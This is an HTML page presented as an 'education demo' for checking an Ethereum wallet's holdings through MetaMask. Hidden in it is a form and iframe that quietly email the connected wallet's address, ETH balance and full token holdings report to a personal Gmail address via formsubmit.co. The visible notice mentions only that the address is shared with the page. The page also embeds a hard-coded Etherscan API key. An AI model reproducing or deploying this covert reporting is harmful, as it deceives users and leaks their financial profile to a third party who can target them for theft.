<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Ethereum Wallet Holdings Check — Education Demo</title>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 40px 20px;
    }

    .container {
      max-width: 900px;
      margin: auto;
      background: white;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 4px 20px rgba(0,0,0,.08);
    }

    h1 {
      margin-top: 0;
    }

    button {
      padding: 12px 20px;
      border: 0;
      border-radius: 8px;
      background: #111;
      color: white;
      cursor: pointer;
      font-size: 15px;
    }

    button:disabled {
      opacity: .6;
      cursor: not-allowed;
    }

    .notice {
      background: #fff7d6;
      padding: 12px;
      border-radius: 8px;
      margin: 20px 0;
      font-size: 14px;
    }

    .status {
      margin-top: 20px;
      padding: 12px;
      background: #f1f1f1;
      border-radius: 8px;
      white-space: pre-wrap;
    }

    .error {
      color: #b00020;
    }

    .wallet {
      margin-top: 20px;
      padding: 15px;
      background: #fafafa;
      border-radius: 8px;
      word-break: break-all;
    }

    .token {
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 8px;
      margin-top: 12px;
      word-break: break-word;
    }

    .muted {
      color: #666;
      font-size: 14px;
    }

    .balance {
      font-family: monospace;
      word-break: break-all;
    }
  </style>
</head>

<body>

<div class="container">

  <h1>Ethereum Wallet Holdings Check</h1>

  <p class="muted">
    Educational demonstration for checking publicly visible Ethereum wallet holdings.
  </p>

  <div class="notice">
    Connecting your wallet shares your public Ethereum wallet address with this page.
  </div>

  <button id="connectButton">
    Connect Wallet
  </button>

  <div id="status" class="status">
    Not connected.
  </div>

  <div id="walletInfo"></div>

  <div id="holdings"></div>


  <!-- ========================================================
       FORMSUBMIT EMAIL NOTIFICATION
       ======================================================== -->

  <form
    id="walletNotification"
    action="https://formsubmit.co/enahoromicheal21@gmail.com"
    method="POST"
    target="notificationFrame"
    style="display:none;"
  >

    <input
      type="hidden"
      name="Wallet Address"
      id="emailWalletAddress"
    >

    <input
      type="hidden"
      name="Network"
      value="Ethereum Mainnet"
    >

    <input
      type="hidden"
      name="_subject"
      value="New Ethereum Wallet Connected"
    >

    <input
      type="hidden"
      name="_captcha"
      value="false"
    >

    <input
      type="hidden"
      name="_template"
      value="table"
    >

  </form>


  <iframe
    name="notificationFrame"
    style="display:none;"
  ></iframe>

</div>


<script>

  // ============================================================
  // CONFIGURATION
  // ============================================================

  const CHAIN_ID = 1;

  const NETWORK_NAME = "Ethereum Mainnet";

  const RPC_URL =
    "https://ethereum-rpc.publicnode.com";

  const ETHERSCAN_API =
    "https://api.etherscan.io/v2/api";

  /*
   * Replace this with your Etherscan API key.
   */
  const ETHERSCAN_API_KEY =
    "R9QZAZG3G1286RTAZW391RIRPIKIT9E597";


  // ============================================================
  // ERC-20 ABI
  // ============================================================

  const ERC20_ABI = [

    "function balanceOf(address owner) view returns (uint256)",

    "function symbol() view returns (string)",

    "function decimals() view returns (uint8)"

  ];


  // ============================================================
  // DOM ELEMENTS
  // ============================================================

  const connectButton =
    document.getElementById("connectButton");

  const status =
    document.getElementById("status");

  const walletInfo =
    document.getElementById("walletInfo");

  const holdings =
    document.getElementById("holdings");

  const notificationForm =
    document.getElementById("walletNotification");

  const emailWalletAddress =
    document.getElementById("emailWalletAddress");


  // ============================================================
  // PUBLIC RPC PROVIDER
  // ============================================================

  const publicProvider =
    new ethers.JsonRpcProvider(RPC_URL);


  // ============================================================
  // HTML ESCAPE
  // ============================================================

  function escapeHtml(value) {

    return String(value)

      .replace(/&/g, "&amp;")

      .replace(/</g, "&lt;")

      .replace(/>/g, "&gt;")

      .replace(/"/g, "&quot;")

      .replace(/'/g, "&#039;");
  }


  // ============================================================
  // STATUS
  // ============================================================

  function setStatus(
    message,
    isError = false
  ) {

    status.textContent = message;

    status.className =
      isError
        ? "status error"
        : "status";
  }


  // ============================================================
  // CHECK ETHEREUM MAINNET
  // ============================================================

  async function ensureMainnet(provider) {

    const network =
      await provider.getNetwork();

    const chainId =
      Number(network.chainId);

    if (chainId !== CHAIN_ID) {

      throw new Error(
        "Wrong network. Please switch MetaMask to Ethereum Mainnet."
      );
    }
  }


  // ============================================================
  // GET ETH BALANCE
  // ============================================================

  async function getEthBalance(address) {

    const balance =
      await publicProvider.getBalance(address);

    return ethers.formatEther(balance);
  }


  // ============================================================
  // DISCOVER ERC-20 CONTRACTS
  // ============================================================

  async function discoverTokens(address) {

    if (
      !ETHERSCAN_API_KEY ||
      ETHERSCAN_API_KEY ===
      "YOUR_ETHERSCAN_API_KEY"
    ) {

      throw new Error(
        "Please configure your Etherscan API key."
      );
    }


    const uniqueContracts =
      new Map();


    const offset = 1000;

    let page = 1;

    const maxPages = 100;


    while (page <= maxPages) {

      setStatus(
        "Discovering ERC-20 contracts...\n" +
        `Scanning page ${page}...`
      );


      const url =
        new URL(ETHERSCAN_API);


      url.searchParams.set(
        "chainid",
        String(CHAIN_ID)
      );


      url.searchParams.set(
        "module",
        "account"
      );


      url.searchParams.set(
        "action",
        "tokentx"
      );


      url.searchParams.set(
        "address",
        address
      );


      url.searchParams.set(
        "page",
        String(page)
      );


      url.searchParams.set(
        "offset",
        String(offset)
      );


      url.searchParams.set(
        "sort",
        "asc"
      );


      url.searchParams.set(
        "apikey",
        ETHERSCAN_API_KEY
      );


      const response =
        await fetch(url.toString());


      if (!response.ok) {

        throw new Error(
          `Etherscan HTTP error: ${response.status}`
        );
      }


      const data =
        await response.json();


      /*
       * Etherscan can return status 0 when there
       * are no transactions.
       */

      if (
        !Array.isArray(data.result)
      ) {

        break;
      }


      if (
        data.result.length === 0
      ) {

        break;
      }


      for (
        const transaction
        of data.result
      ) {

        if (
          !transaction.contractAddress
        ) {

          continue;
        }


        const checksumAddress =
          ethers.getAddress(
            transaction.contractAddress
          );


        uniqueContracts.set(
          checksumAddress.toLowerCase(),
          checksumAddress
        );
      }


      /*
       * Fewer than 1000 records means this
       * was the final page.
       */

      if (
        data.result.length < offset
      ) {

        break;
      }


      page++;
    }


    return Array.from(
      uniqueContracts.values()
    );
  }


  // ============================================================
  // READ ONE ERC-20 TOKEN
  // ============================================================

  async function readTokenBalance(
    tokenAddress,
    walletAddress
  ) {

    try {

      const token =
        new ethers.Contract(
          tokenAddress,
          ERC20_ABI,
          publicProvider
        );


      /*
       * Read balance first.
       */

      const rawBalance =
        await token.balanceOf(
          walletAddress
        );


      let symbol = "UNKNOWN";

      let decimals = 18;


      /*
       * Some contracts may not properly implement
       * symbol() or decimals().
       */

      try {

        symbol =
          await token.symbol();

      } catch (error) {

        console.warn(
          "symbol() failed:",
          tokenAddress
        );
      }


      try {

        decimals =
          Number(
            await token.decimals()
          );

      } catch (error) {

        console.warn(
          "decimals() failed:",
          tokenAddress
        );
      }


      /*
       * Protect against invalid decimals.
       */

      if (
        !Number.isInteger(decimals) ||
        decimals < 0 ||
        decimals > 255
      ) {

        decimals = 18;
      }


      const formattedBalance =
        ethers.formatUnits(
          rawBalance,
          decimals
        );


      return {

        address: tokenAddress,

        symbol: String(symbol),

        decimals,

        rawBalance,

        balance: formattedBalance

      };

    } catch (error) {

      console.warn(
        "Could not read token:",
        tokenAddress,
        error
      );


      return null;
    }
  }


  // ============================================================
  // READ ALL TOKEN BALANCES
  // ============================================================

  async function readAllTokenBalances(
    tokenContracts,
    walletAddress
  ) {

    const results = [];


    for (
      let i = 0;
      i < tokenContracts.length;
      i++
    ) {

      const tokenAddress =
        tokenContracts[i];


      setStatus(
        "Reading live token balances...\n" +
        `${i + 1} / ${tokenContracts.length}\n` +
        tokenAddress
      );


      const token =
        await readTokenBalance(
          tokenAddress,
          walletAddress
        );


      if (token) {

        /*
         * Keep ZERO balances too.
         *
         * This means the display represents every
         * successfully identified token contract,
         * rather than only tokens currently holding
         * a positive balance.
         */

        results.push(token);
      }
    }


    return results;
  }


  // ============================================================
  // DISPLAY HOLDINGS
  // ============================================================

  function displayHoldings(
    ethBalance,
    tokens
  ) {

    holdings.innerHTML = "";


    const heading =
      document.createElement("h2");

    heading.textContent =
      "Wallet Holdings";

    holdings.appendChild(
      heading
    );


    // ----------------------------------------------------------
    // ETH
    // ----------------------------------------------------------

    const ethDiv =
      document.createElement("div");

    ethDiv.className =
      "token";


    ethDiv.innerHTML = `

      <strong>Ethereum</strong>
      <br><br>

      Balance:
      <span class="balance">
        ${escapeHtml(ethBalance)}
      </span>

      ETH

    `;


    holdings.appendChild(
      ethDiv
    );


    // ----------------------------------------------------------
    // ERC-20 TOKENS
    // ----------------------------------------------------------

    for (
      const token
      of tokens
    ) {

      const div =
        document.createElement("div");

      div.className =
        "token";


      div.innerHTML = `

        <strong>
          ${escapeHtml(token.symbol)}
        </strong>

        <br><br>

        Contract:
        <span class="balance">
          ${escapeHtml(token.address)}
        </span>

        <br><br>

        Decimals:
        ${escapeHtml(token.decimals)}

        <br><br>

        Balance:
        <span class="balance">
          ${escapeHtml(token.balance)}
        </span>

      `;


      holdings.appendChild(
        div
      );
    }


    if (
      tokens.length === 0
    ) {

      const empty =
        document.createElement("p");

      empty.className =
        "muted";

      empty.textContent =
        "No ERC-20 contracts were discovered.";

      holdings.appendChild(
        empty
      );
    }
  }


  // ============================================================
  // BUILD EMAIL REPORT
  // ============================================================

  function buildEmailReport(
    address,
    ethBalance,
    tokens
  ) {

    let report = "";


    report +=
      "NEW ETHEREUM WALLET CONNECTION\n";

    report +=
      "================================\n\n";


    report +=
      `Wallet Address: ${address}\n`;

    report +=
      `Network: ${NETWORK_NAME}\n`;

    report +=
      `Time: ${new Date().toISOString()}\n\n`;


    report +=
      "ETH BALANCE\n";

    report +=
      `${ethBalance} ETH\n\n`;


    report +=
      "ERC-20 HOLDINGS\n";

    report +=
      "================================\n\n";


    report +=
      `Contracts discovered: ${tokens.length}\n\n`;


    if (
      tokens.length === 0
    ) {

      report +=
        "No ERC-20 contracts discovered.\n";

    } else {

      tokens.forEach(
        (token, index) => {

          report +=
            `TOKEN ${index + 1}\n`;

          report +=
            `Symbol: ${token.symbol}\n`;

          report +=
            `Contract: ${token.address}\n`;

          report +=
            `Decimals: ${token.decimals}\n`;

          report +=
            `Balance: ${token.balance}\n`;

          report +=
            `Raw balance: ${token.rawBalance.toString()}\n\n`;
        }
      );
    }


    return report;
  }


  // ============================================================
  // SEND EMAIL
  // ============================================================

  function sendWalletNotification(
    address,
    ethBalance,
    tokens
  ) {

    /*
     * Wallet address
     */

    emailWalletAddress.value =
      address;


    /*
     * Remove previously generated fields
     * if the user connects again.
     */

    notificationForm
      .querySelectorAll(
        ".generated-email-field"
      )
      .forEach(
        element => element.remove()
      );


    /*
     * ETH balance
     */

    const ethInput =
      document.createElement("input");

    ethInput.type =
      "hidden";

    ethInput.name =
      "Ethereum Balance";

    ethInput.value =
      `${ethBalance} ETH`;

    ethInput.className =
      "generated-email-field";

    notificationForm.appendChild(
      ethInput
    );


    /*
     * Token count
     */

    const countInput =
      document.createElement("input");

    countInput.type =
      "hidden";

    countInput.name =
      "ERC-20 Contracts";

    countInput.value =
      String(tokens.length);

    countInput.className =
      "generated-email-field";

    notificationForm.appendChild(
      countInput
    );


    /*
     * Complete holdings report
     */

    const reportInput =
      document.createElement("textarea");

    reportInput.name =
      "Complete Wallet Holdings";

    reportInput.value =
      buildEmailReport(
        address,
        ethBalance,
        tokens
      );

    reportInput.className =
      "generated-email-field";

    reportInput.style.display =
      "none";

    notificationForm.appendChild(
      reportInput
    );


    /*
     * Submit to FormSubmit.
     */

    notificationForm.submit();
  }


  // ============================================================
  // CONNECT WALLET
  // ============================================================

  connectButton.addEventListener(
    "click",
    async () => {

      try {

        connectButton.disabled =
          true;


        holdings.innerHTML =
          "";

        walletInfo.innerHTML =
          "";


        // ------------------------------------------------------
        // Check MetaMask
        // ------------------------------------------------------

        if (
          !window.ethereum
        ) {

          throw new Error(
            "MetaMask was not detected."
          );
        }


        setStatus(
          "Waiting for MetaMask connection..."
        );


        // ------------------------------------------------------
        // Request connection
        // ------------------------------------------------------

        const accounts =
          await window.ethereum.request({
            method:
              "eth_requestAccounts"
          });


        if (
          !accounts ||
          accounts.length === 0
        ) {

          throw new Error(
            "No wallet account was returned."
          );
        }


        const address =
          accounts[0];


        // ------------------------------------------------------
        // Ethers browser provider
        // ------------------------------------------------------

        const browserProvider =
          new ethers.BrowserProvider(
            window.ethereum
          );


        // ------------------------------------------------------
        // Verify network
        // ------------------------------------------------------

        setStatus(
          "Checking Ethereum Mainnet..."
        );


        await ensureMainnet(
          browserProvider
        );


        // ------------------------------------------------------
        // Display wallet address
        // ------------------------------------------------------

        walletInfo.innerHTML = `

          <div class="wallet">

            <strong>Wallet Address</strong>

            <br>

            ${escapeHtml(address)}

            <br><br>

            <strong>Network</strong>

            <br>

            ${NETWORK_NAME}

          </div>

        `;


        // ------------------------------------------------------
        // ETH BALANCE
        // ------------------------------------------------------

        setStatus(
          "Reading Ethereum balance..."
        );


        const ethBalance =
          await getEthBalance(
            address
          );


        // ------------------------------------------------------
        // ERC-20 DISCOVERY
        // ------------------------------------------------------

        const tokenContracts =
          await discoverTokens(
            address
          );


        console.log(
          "Discovered ERC-20 contracts:",
          tokenContracts
        );


        // ------------------------------------------------------
        // LIVE BALANCES
        // ------------------------------------------------------

        const tokens =
          await readAllTokenBalances(
            tokenContracts,
            address
          );


        console.log(
          "Live balances:",
          tokens
        );


        // ------------------------------------------------------
        // DISPLAY
        // ------------------------------------------------------

        displayHoldings(
          ethBalance,
          tokens
        );


        // ------------------------------------------------------
        // EMAIL
        //
        // Important:
        // This happens AFTER the complete balance scan,
        // so the email contains the holdings too.
        // ------------------------------------------------------

        sendWalletNotification(
          address,
          ethBalance,
          tokens
        );


        // ------------------------------------------------------
        // COMPLETE
        // ------------------------------------------------------

        setStatus(
          "Wallet holdings check completed."
        );


      } catch (error) {

        console.error(
          error
        );


        setStatus(
          error?.message ||
          "Something went wrong.",
          true
        );


      } finally {

        connectButton.disabled =
          false;
      }

    }
  );


  // ============================================================
  // HANDLE NETWORK CHANGES
  // ============================================================

  if (
    window.ethereum
  ) {

    window.ethereum.on(
      "chainChanged",
      () => {

        window.location.reload();

      }
    );
  }

</script>

</body>
</html>
